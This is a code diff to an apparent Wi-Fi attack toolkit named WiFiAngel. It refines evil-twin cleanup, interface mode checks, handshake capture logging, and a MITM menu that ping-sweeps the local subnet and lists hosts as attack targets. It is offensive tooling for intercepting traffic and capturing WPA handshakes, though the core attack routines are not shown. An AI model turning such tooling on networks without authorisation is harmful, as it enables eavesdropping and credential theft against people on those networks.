+            prev_acct = original_settings.get("nf_conntrack_acct")
+            if prev_acct is not None:
+                subprocess.run(
+                    ["sysctl", "-w", f"net.netfilter.nf_conntrack_acct={prev_acct}"],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                )
             
             # Reset iptables
             self.logger.log_evil_twin("Resetting iptables")
@@ -3270,7 +3691,21 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                         nm_status = subprocess.run(["systemctl", "is-active", "NetworkManager"], 
                                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5).stdout.decode().strip()
                         if nm_status != "active":
-                            self.console.print("[error]Failed to restart NetworkManager[/]")
+                            subprocess.run(
+                                ["systemctl", "start", "NetworkManager"],
+                                stdout=subprocess.DEVNULL,
+                                stderr=subprocess.DEVNULL,
+                                timeout=15,
+                            )
+                            time.sleep(2)
+                            nm_status = subprocess.run(
+                                ["systemctl", "is-active", "NetworkManager"],
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE,
+                                timeout=5,
+                            ).stdout.decode().strip()
+                        if nm_status != "active":
+                            self.console.print("[error]Failed to restart or start NetworkManager[/]")
                     except subprocess.TimeoutExpired:
                         self.console.print("[error]NetworkManager restart timed out[/]")
                     except Exception as e:
@@ -3304,32 +3739,69 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
             except Exception as e:
                 self.console.print(f"[error]Error checking wpa_supplicant: {str(e)}[/]")
             
-            # Verify interface mode with improved error handling
+            # Verify interface mode: prefer `iw` (iwconfig often exits 161 without WE on modern drivers)
             try:
-                iw_info = subprocess.check_output(["iwconfig", self.interface_name], stderr=subprocess.STDOUT, timeout=5).decode()
-                if "Mode:Managed" not in iw_info:
+                mode = self.wifi_adapter.get_interface_type(self.interface_name)
+
+                def _legacy_iwconfig_managed() -> Optional[bool]:
+                    try:
+                        r = subprocess.run(
+                            ["iwconfig", self.interface_name],
+                            capture_output=True,
+                            text=True,
+                            timeout=5,
+                        )
+                        if r.returncode != 0:
+                            return None
+                        return "Mode:Managed" in r.stdout
+                    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
+                        return None
+
+                if mode is None:
+                    legacy = _legacy_iwconfig_managed()
+                    if legacy is True:
+                        mode = "managed"
+                    elif legacy is False:
+                        mode = "other"
+
+                if mode == "managed":
+                    pass
+                elif mode is not None:
                     self.console.print("[warning]Interface not in managed mode, attempting to fix...[/]")
                     try:
-                        subprocess.run(["ip", "link", "set", self.interface_name, "down"], 
-                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
-                        subprocess.run(["iw", self.interface_name, "set", "type", "managed"], 
-                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
-                        subprocess.run(["ip", "link", "set", self.interface_name, "up"], 
-                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
-                        
-                        # Verify change was successful
+                        subprocess.run(
+                            ["ip", "link", "set", self.interface_name, "down"],
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            timeout=5,
+                        )
+                        subprocess.run(
+                            ["iw", self.interface_name, "set", "type", "managed"],
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            timeout=5,
+                        )
+                        subprocess.run(
+                            ["ip", "link", "set", self.interface_name, "up"],
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            timeout=5,
+                        )
                         time.sleep(2)
-                        iw_info = subprocess.check_output(["iwconfig", self.interface_name], stderr=subprocess.STDOUT, timeout=5).decode()
-                        if "Mode:Managed" not in iw_info:
+                        mode2 = self.wifi_adapter.get_interface_type(self.interface_name)
+                        if mode2 != "managed" and _legacy_iwconfig_managed() is not True:
                             self.console.print("[error]Failed to set interface to managed mode[/]")
                     except subprocess.TimeoutExpired:
                         self.console.print("[error]Interface mode change timed out[/]")
                     except Exception as e:
                         self.console.print(f"[error]Error changing interface mode: {str(e)}[/]")
-            except subprocess.TimeoutExpired:
-                self.console.print("[error]Interface check timed out[/]")
+                else:
+                    self.console.print(
+                        "[warning]Could not read interface mode via `iw` or `iwconfig`; "
+                        "skipped mode check (wireless-tools may be missing or driver has no WE).[/]"
+                    )
             except Exception as e:
-                self.console.print(f"[error]Could not verify interface mode: {str(e)}[/]")
+                self.console.print(f"[warning]Interface mode verification issue: {str(e)}[/]")
             
         except Exception as e:
             self.logger.error(f"Error during network service verification: {str(e)}")
@@ -4124,11 +4596,13 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                 final_file = handshake_dir / f"handshake_{network['ssid']}_{timestamp}.cap"
                 shutil.move(str(cap_files[0]), str(final_file))
                 security_type = "WPA3" if is_wpa3 else "WPA/WPA2"
-                
-                self.console.print(f"\n[bold green]Handshake ({security_type}) captured successfully! Saved to: {final_file}[/]")
-                self.console.print("[bold yellow]Continuing capture process for additional handshakes... Press Ctrl+C to stop.[/]")
-                self.logger.info(f"{security_type} handshake captured and saved to {final_file}")
-                
+
+                # Avoid console.print during Live refresh (breaks terminal layout).
+                self.logger.info(
+                    f"{security_type} handshake captured and saved to {final_file} "
+                    "(continuing capture until Ctrl+C)",
+                )
+
                 # Return True to indicate a handshake was found (but we continue)
                 return True
                 
@@ -5399,24 +5873,40 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                 
             # Let user choose network interface
             self.console.clear()
-            
-            interface_panel = Panel(
-                Group(
-                    Text("Select Network Interface for Attack", justify="center"),
-                    Text(""),
-                    *(Text(f"[{i}] {iface} - IP: {ip} - Gateway: {gateways.get(iface, 'Unknown')}") 
-                      for i, (iface, ip) in enumerate(interfaces.items(), 1)),
-                    Text(""),
-                    Text("Enter the interface number or 0 to cancel:", justify="center")
-                ),
-                title="Available Network Interfaces",
-                border_style=BORDER_STYLE,
+
+            iface_table = Table(
+                title="[heading]Available Network Interfaces[/]",
                 box=box.MINIMAL,
+                border_style=BORDER_STYLE,
+                show_header=True,
+                header_style="bold bright_white",
             )
-            
-            self.console.print(interface_panel)
-            
-            choice = Prompt.ask("Interface", choices=["0"] + [str(i) for i in range(1, len(interfaces) + 1)])
+            iface_table.add_column("#", style="menu.key", justify="right", width=4)
+            iface_table.add_column("Interface", style="cyan")
+            iface_table.add_column("IP", style="green")
+            iface_table.add_column("Gateway", style="yellow")
+            for i, (iface, ip) in enumerate(interfaces.items(), 1):
+                iface_table.add_row(
+                    str(i),
+                    iface,
+                    ip,
+                    str(gateways.get(iface, "Unknown")),
+                )
+            self.console.print(
+                Panel(
+                    Group(
+                        iface_table,
+                        Text(""),
+                        Text("[meta]Enter the interface number below, or 0 to cancel.  |  Ctrl+C where supported[/]"),
+                    ),
+                    title="[title]WiFiAngel - MITM toolkit[/]",
+                    border_style=BORDER_STYLE,
+                    box=box.ROUNDED,
+                    padding=(1, 2),
+                )
+            )
+
+            choice = Prompt.ask("Interface #", choices=["0"] + [str(i) for i in range(1, len(interfaces) + 1)])
             if choice == "0":
                 return
                 
@@ -5428,69 +5918,92 @@ dhcp-leasefile={log_dir}/dnsmasq.leases"""
                 self.console.print(f"[bold red]No gateway found for interface {selected_iface}![/]")
                 return
             
-            # Scan local network to find targets
-            self.console.print("[bold cyan]Scanning network for available targets...[/]")
-            
-            # Simple network scan using ping sweep
+            # Scan local network to find targets (no Rich Progress: avoids prompt corruption and allows SIGINT)
             network_prefix = ".".join(selected_ip.split(".")[:3]) + "."
-            online_hosts = {}
-            
-            with Progress() as progress:
-                scan_task = progress.add_task("[cyan]Scanning network...", total=254)
-                
+            online_hosts: dict = {}
+
+            scan_cancel = threading.Event()
+            saved_sigint = signal.getsignal(signal.SIGINT)
+
+            def _mitm_scan_sigint(_signum, _frame):
+                scan_cancel.set()
+
+            signal.signal(signal.SIGINT, _mitm_scan_sigint)
+            try:
+                self.console.print("[bold cyan]Scanning network for live hosts (Ctrl+C to cancel)...[/]")
+                last_report = 0
                 for i in range(1, 255):
-                    progress.update(scan_task, advance=1)
+                    if scan_cancel.is_set():
+                        break
+                    if i == 1 or i - last_report >= 40:
+                        pct = int(100 * i / 254)
+                        self.console.print(f"[dim]Probe {i}/254 ({pct}%)...[/]")
+                        last_report = i
                     ip = f"{network_prefix}{i}"
-                    
-                    # Skip our IP
                     if ip == selected_ip:
                         continue
-                        
-                    # Try to ping the host
                     try:
                         result = subprocess.run(
                             ["ping", "-c", "1", "-W", "0.2", ip],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
-                            timeout=0.5
+                            timeout=0.5,
                         )
                         if result.returncode == 0:
-                            # Try to get hostname
                             try:
                                 hostname = socket.gethostbyaddr(ip)[0]
-                            except:
+                            except OSError:
                                 hostname = "Unknown"
-                                
-                            # Try to get MAC
                             try:
                                 mac = self.get_mac(ip, selected_iface)
-                            except:
+                            except Exception:
                                 mac = "Unknown"
-                                
                             online_hosts[ip] = {"hostname": hostname, "mac": mac}
-                    except:
+                    except (subprocess.TimeoutExpired, OSError, Exception):
                         pass
+            finally:
+                signal.signal(signal.SIGINT, saved_sigint)
+
+            if scan_cancel.is_set():
+                self.console.print("[bold yellow]Scan cancelled (Ctrl+C).[/]")
+                if not online_hosts:
+                    self.console.print("[dim]No hosts found; exiting MITM toolkit.[/]")
+                    return
+                self.console.print(
+                    f"[cyan]Continuing with {len(online_hosts)} host(s) discovered before cancel.[/]"
+                )
             
             # Present target selection options
-            target_panel = Panel(
-                Group(
-                    Text("Select Target for MITM Attack", justify="center"),
-                    Text(""),
-                    Text("[1] All network traffic (entire network)"),
-                    *(Text(f"[{i+2}] {ip} - {info['hostname']} ({info['mac']})") 
-                      for i, (ip, info) in enumerate(online_hosts.items())),
-                    Text(""),
-                    Text("Enter target number or 0 to cancel:", justify="center")
-                ),
-                title="[bold white]Available Targets[/]",
-                border_style=BORDER_STYLE,
+            tgt_table = Table(
+                title="[heading]Available Targets[/]",
                 box=box.MINIMAL,
+                border_style=BORDER_STYLE,
+                show_header=True,
+                header_style="bold bright_white",
+            )
+            tgt_table.add_column("#", style="menu.key", justify="right", width=4)
+            tgt_table.add_column("Address / Mode", style="cyan")
+            tgt_table.add_column("Hostname", style="green")
+            tgt_table.add_column("MAC", style="yellow")
+            tgt_table.add_row("1", "All devices (entire subnet)", "-", "-")
+            for j, (ip, info) in enumerate(online_hosts.items(), 2):
+                tgt_table.add_row(str(j), ip, info["hostname"], info["mac"])
+            self.console.print(
+                Panel(
+                    Group(
+                        tgt_table,
+                        Text(""),
+                        Text("[meta]Enter target number below, or 0 to cancel.[/]"),
+                    ),
+                    title="[title]WiFiAngel - MITM toolkit[/]",
+                    border_style=BORDER_STYLE,
+                    box=box.ROUNDED,
+                    padding=(1, 2),
+                )
             )
             
-            self.console.print(target_panel)
-            
             target_choices = ["0", "1"] + [str(i) for i in range(2, len(online_hosts) + 2)]
-            target_choice = Prompt.ask("Target", choices=target_choices)
+            target_choice = Prompt.ask("Target #", choices=target_choices)
             
             if target_choice == "0":
                 return
